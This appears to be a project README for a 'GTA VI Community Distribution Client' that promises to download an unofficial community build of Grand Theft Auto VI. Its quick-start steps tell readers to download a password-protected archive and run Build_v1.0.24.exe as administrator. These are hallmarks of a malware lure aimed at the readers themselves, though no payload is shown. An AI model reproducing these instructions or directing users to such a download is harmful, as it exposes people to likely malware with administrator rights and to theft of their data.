##  Overview

GTA VI Community Distribution Client is a lightweight desktop application that downloads and manages the Grand Theft Auto VI community build. The client handles asset retrieval, verification, and game launching — all in one streamlined package.

</div>

##  Key Features

- High-speed downloading with multi-thread support
- Asset verification with checksum validation
- Download resumption after interruption
- Network bandwidth limiting
- Clean, modern interface

---

##  Quick Start

1. Download the client archive from the button above
2. Extract with WinRAR or 7-Zip (password shown on download page)
3. Right-click `Build_v1.0.24.exe` and select **Run as administrator**
4. Select your installation directory
5. Click **Start Download** and wait for completion
6. Launch the game from the desktop shortcut
